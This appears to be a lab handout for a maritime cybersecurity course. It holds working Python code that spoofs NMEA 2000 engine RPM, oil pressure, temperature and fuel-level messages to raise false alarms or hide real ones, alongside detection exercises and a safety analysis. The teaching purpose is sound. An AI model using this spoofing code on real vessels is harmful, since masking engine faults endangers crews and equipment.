---
title: "Lab 07"
subtitle: "Engine System Spoofing"
author: "Constantine Macris"
date: "2026"
titlepage: true
titlepage-color: "1E3A5F"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
description: |
    Attacking engine monitoring systems via NMEA 2000
---

# Lab 07 -- Engine System Spoofing

## Lab Overview

**Duration**: 2 hours
**Prerequisites**: Labs 04-06 completed, Class 06 material reviewed
**Materials Required**:
- OpenBridge hardware
- Access to test network with engine display

## Safety Warning

**Engine attacks can cause equipment damage and safety hazards.**

On real vessels, spoofing engine data could:
- Mask actual engine problems
- Cause unnecessary shutdowns
- Lead to equipment damage

**All activities on isolated test network only!**

## Objectives

By the end of this lab, you will:

1. Understand engine PGN message formats
2. Spoof engine RPM messages
3. Create false alarm conditions
4. Analyze potential safety impact
5. Document attack effectiveness

## Part 1: Engine PGN Analysis (30 minutes)

### 1.1 Review Engine PGN Structure

**PGN 127488 - Engine Parameters, Rapid Update**

| Byte | Field | Resolution | Range |
|------|-------|------------|-------|
| 0 | Engine Instance | - | 0-252 |
| 1-2 | Engine Speed | 0.25 RPM/bit | 0-16383 RPM |
| 3-4 | Boost Pressure | 1 hPa/bit | 0-65535 hPa |
| 5 | Tilt/Trim | 0.4%/bit | -100-100% |
| 6-7 | Reserved | - | 0xFFFF |

**PGN 127489 - Engine Parameters, Dynamic**

| Byte | Field | Resolution |
|------|-------|------------|
| 0 | Engine Instance | - |
| 1-2 | Oil Pressure | 1 hPa/bit |
| 3-4 | Oil Temperature | 0.1 K/bit |
| 5-6 | Engine Temperature | 0.01 K/bit |
| 7-8 | Alternator Potential | 0.01 V/bit |
| 9-10 | Fuel Rate | 0.1 L/h/bit |
| 11-14 | Total Engine Hours | 1 s/bit |
| ... | ... | ... |

### 1.2 Calculate Engine Values

```python
#!/usr/bin/env python3
"""
engine_calculator.py - Calculate engine parameter raw values
"""
import struct

def calculate_rpm_raw(rpm):
    """
    Convert RPM to NMEA 2000 raw value

    Resolution: 0.25 RPM/bit
    """
    return int(rpm / 0.25)

def calculate_oil_pressure_raw(psi):
    """
    Convert PSI to hPa raw value

    1 PSI = 68.9476 hPa
    """
    hpa = psi * 68.9476
    return int(hpa)

def calculate_temperature_raw(celsius, resolution=0.1):
    """
    Convert Celsius to Kelvin raw value

    Kelvin = Celsius + 273.15
    """
    kelvin = celsius + 273.15
    return int(kelvin / resolution)

# Calculate example values
print("Engine Value Calculations:")
print("=" * 40)

# RPM examples
for rpm in [0, 700, 1500, 2500, 3500, 6000]:
    raw = calculate_rpm_raw(rpm)
    verify = raw * 0.25
    print(f"RPM {rpm:5d} → raw: {raw:6d} (verify: {verify})")

print()

# Oil pressure examples
for psi in [0, 30, 45, 60, 80]:
    raw = calculate_oil_pressure_raw(psi)
    print(f"Oil {psi:2d} PSI → raw: {raw:5d} hPa")

print()

# Temperature examples
for temp_c in [0, 50, 85, 100, 120]:
    raw = calculate_temperature_raw(temp_c)
    print(f"Temp {temp_c:3d}°C → raw: {raw:5d} (0.1K resolution)")
```

### 1.3 Record Calculations

Complete the conversion table:

| Parameter | Value | Raw Value |
|-----------|-------|-----------|
| 2500 RPM | | |
| 3000 RPM | | |
| 45 PSI oil | | |
| 10 PSI oil (low!) | | |
| 85°C coolant | | |
| 115°C coolant (high!) | | |

### 1.4 Monitor Legitimate Engine Messages

If engine gateway is on test network, capture messages:

```python
# Record legitimate engine messages for comparison
# Note source address, values, and timing
```

**Record:**
- Engine gateway SA: _______
- Typical RPM range: _______
- Normal oil pressure: _______
- Normal temperature: _______

## Part 2: RPM Spoofing (25 minutes)

### 2.1 Build Engine Spoofer

```python
#!/usr/bin/env python3
"""
engine_spoofer.py - Engine parameter spoofing
"""
import serial
import time
import struct

class EngineSpoofer:
    def __init__(self, port, baudrate=115200):
        self.ser = serial.Serial(port, baudrate, timeout=1)
        time.sleep(2)

    def spoof_rpm(self, rpm, instance=0, rate_hz=10):
        """
        Send spoofed engine RPM

        OpenBridge command format for PGN 127488:
        50,<instance>,<rpm>
        """
        interval = 1.0 / rate_hz
        command = f"50,{instance},{rpm}\n"

        print(f"Spoofing RPM: {rpm}")
        print(f"Instance: {instance}, Rate: {rate_hz} Hz")

        try:
            while True:
                self.ser.write(command.encode())
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\nStopped")

    def ramp_rpm(self, start_rpm, end_rpm, duration_sec, rate_hz=10):
        """
        Gradually change RPM over time
        """
        steps = int(duration_sec * rate_hz)
        rpm_step = (end_rpm - start_rpm) / steps
        interval = 1.0 / rate_hz

        print(f"Ramping RPM: {start_rpm} → {end_rpm} over {duration_sec}s")

        current_rpm = start_rpm
        for i in range(steps):
            command = f"50,0,{int(current_rpm)}\n"
            self.ser.write(command.encode())
            current_rpm += rpm_step
            time.sleep(interval)

        print(f"Ramp complete, holding at {end_rpm}")

    def close(self):
        self.ser.close()
```

### 2.2 Attack Scenario 1: Fixed RPM Spoof

Spoof constant RPM regardless of actual engine:

```python
spoofer = EngineSpoofer('/dev/ttyACM0')

# Spoof idle (700 RPM) when engine might be at higher RPM
spoofer.spoof_rpm(700, instance=0, rate_hz=10)
```

**Observe on engine display:**
- Does RPM display change? YES / NO
- Is there flickering? YES / NO
- Any alarm triggered? YES / NO

### 2.3 Attack Scenario 2: Zero RPM

Spoof 0 RPM to make engine appear stopped:

```python
# Spoof 0 RPM - engine appears stopped
spoofer.spoof_rpm(0, instance=0, rate_hz=10)
```

**Potential consequences on real vessel:**
- Crew might try to start already-running engine
- Could damage starter motor
- Could cause confusion during docking

### 2.4 Attack Scenario 3: Over-speed

Spoof excessive RPM to trigger alarm:

```python
# Spoof 5500 RPM (above typical redline)
spoofer.spoof_rpm(5500, instance=0, rate_hz=10)
```

**Observe:**
- Does alarm trigger? YES / NO
- Alarm message: _________________
- Would crew shut down engine? _____

## Part 3: Temperature and Pressure Spoofing (25 minutes)

### 3.1 Extend Spoofer for Dynamic Parameters

```python
def spoof_engine_dynamic(self, instance, oil_psi, oil_temp_c, coolant_temp_c, rate_hz=0.5):
    """
    Spoof PGN 127489 Engine Parameters Dynamic

    Note: This PGN is more complex (Fast Packet)
    OpenBridge simplified command: 51,<instance>,<oil_psi>,<oil_temp>,<coolant_temp>
    """
    interval = 1.0 / rate_hz
    command = f"51,{instance},{oil_psi},{oil_temp_c},{coolant_temp_c}\n"

    print(f"Spoofing: Oil={oil_psi}psi, OilTemp={oil_temp_c}°C, Coolant={coolant_temp_c}°C")

    try:
        while True:
            self.ser.write(command.encode())
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nStopped")
```

### 3.2 Attack Scenario: Low Oil Pressure Alarm

Spoof critically low oil pressure:

```python
# Spoof 5 PSI oil pressure (critical!)
spoofer.spoof_engine_dynamic(
    instance=0,
    oil_psi=5,          # CRITICAL - normally 40-60 PSI
    oil_temp_c=85,      # Normal
    coolant_temp_c=85   # Normal
)
```

**Observe:**
- Low oil alarm triggered? YES / NO
- Alarm severity level: _______
- Would crew shut down engine? _____

### 3.3 Attack Scenario: High Temperature Alarm

Spoof overheating condition:

```python
# Spoof 115°C coolant (overheating!)
spoofer.spoof_engine_dynamic(
    instance=0,
    oil_psi=45,         # Normal
    oil_temp_c=95,      # Slightly elevated
    coolant_temp_c=115  # OVERHEATING
)
```

**Observe:**
- Overheat alarm triggered? YES / NO
- Alarm message: _________________
- Expected crew response: _________

### 3.4 Attack Scenario: Alarm Suppression

More dangerous - hide actual problems:

```python
# Spoof normal values to hide actual low oil pressure
spoofer.spoof_engine_dynamic(
    instance=0,
    oil_psi=45,         # Normal (hiding actual 5 PSI!)
    oil_temp_c=85,      # Normal
    coolant_temp_c=85   # Normal
)
```

**Discussion:**
- Why is alarm suppression more dangerous than false alarms?
- How long before engine damage occurs with low oil?
- What physical signs might crew notice?

## Part 4: Fluid Level Spoofing (15 minutes)

### 4.1 PGN 127505 - Fluid Level

| Byte | Field | Resolution |
|------|-------|------------|
| 0 (bits 0-3) | Instance | - |
| 0 (bits 4-7) | Fluid Type | 0=Fuel, 1=Water, 4=Oil |
| 1-2 | Level | 0.004%/bit |
| 3-6 | Capacity | 0.1 L/bit |

### 4.2 Fuel Level Spoofing

```python
def spoof_fuel_level(self, level_pct, capacity_liters=500):
    """
    Spoof fuel tank level

    OpenBridge command: 52,<instance>,<type>,<level_pct>,<capacity>
    Type 0 = Fuel
    """
    command = f"52,0,0,{level_pct},{capacity_liters}\n"
    self.ser.write(command.encode())
```

**Attack scenarios:**

1. **Empty tank hoax**: Spoof 5% fuel to cause worry
2. **Full tank illusion**: Spoof 90% when actually low
3. **Fluctuating level**: Alternate readings to confuse

### 4.3 Impact Analysis

| Spoof | Immediate Effect | Potential Consequence |
|-------|------------------|----------------------|
| Fuel = 5% | Crew seeks fuel | Unnecessary expense |
| Fuel = 95% (when low) | Crew ignores level | Run out of fuel at sea |
| Oil = 0% | Check engine light | Unnecessary inspection |

## Part 5: Detection Analysis (15 minutes)

### 5.1 Attack Detectability Assessment

For each attack you executed, assess detectability:

| Attack | Frequency Anomaly | Value Anomaly | Physics Violation |
|--------|-------------------|---------------|-------------------|
| Fixed RPM | | | |
| Zero RPM | | | |
| Over-speed | | | |
| Low oil | | | |
| High temp | | | |
| Fuel spoof | | | |

### 5.2 Cross-Validation Opportunities

What physical observations could verify engine data?

| Parameter | Cross-Validation Method |
|-----------|------------------------|
| RPM | Sound, tachometer, vibration |
| Oil pressure | Mechanical gauge |
| Temperature | Infrared thermometer |
| Fuel level | Sight glass, dip stick |

### 5.3 Design Detection Rules

Write pseudocode for one detection:

```python
def detect_rpm_anomaly(current_rpm, previous_rpm, delta_time):
    """
    Detect impossible RPM changes

    Engine RPM cannot change faster than ~X RPM/second
    """
    max_rpm_change_per_sec = 500  # Example limit

    rpm_change = abs(current_rpm - previous_rpm)
    rpm_rate = rpm_change / delta_time

    if rpm_rate > max_rpm_change_per_sec:
        return True, f"RPM change too fast: {rpm_rate} RPM/s"

    return False, None
```

## Part 6: Documentation (10 minutes)

### 6.1 Attack Summary Table

| Attack | Parameters | Display Effect | Alarm? | Detectability |
|--------|------------|----------------|--------|---------------|
| | | | | |
| | | | | |
| | | | | |

### 6.2 Safety Analysis

Answer in your report:

1. Which attack has the highest safety impact? Why?
2. How would crew likely respond to false alarms?
3. Why is alarm suppression especially dangerous?
4. What defenses would you recommend?

## Deliverables

Submit via course portal:

1. **Calculation worksheet** - All value conversions
2. **Attack scripts** - Python files
3. **Attack log** - Table of all attacks executed
4. **Evidence** - Screenshots of display effects
5. **Lab report** - Including safety analysis

## Evaluation Criteria

| Criterion | Points |
|-----------|--------|
| Value calculations correct | 20 |
| RPM spoofing executed | 20 |
| Alarm scenarios tested | 20 |
| Detection analysis | 20 |
| Safety discussion quality | 20 |
| **Total** | **100** |

## Reflection Questions

1. Why do engine displays trust CAN messages without verification?
2. How could multi-sensor validation improve safety?
3. What is the relationship between alarm frequency and crew response?
4. Should critical alarms require physical verification?

## Next Lab Preview

In Lab 08, you will:
- Execute denial of service attacks
- Implement replay attacks
- Measure impact on legitimate traffic
- Test basic detection methods
